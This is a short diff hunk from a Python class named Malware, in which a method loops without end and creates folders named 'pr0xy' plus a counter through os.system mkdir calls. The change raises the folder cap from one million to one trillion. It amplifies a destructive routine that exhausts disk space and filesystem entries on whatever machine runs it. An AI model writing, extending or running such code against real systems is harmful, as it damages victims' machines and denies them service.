@@ -20,7 +20,7 @@ class Malware(object):
         FolderName = "pr0xy"
         while True:
             Counter += 1
-            if Counter <= 1000000:
+            if Counter <= 1000000000000:
                 os.system("mkdir {}{}".format(FolderName, str(Counter)))
     
     def OpenFolder(self):
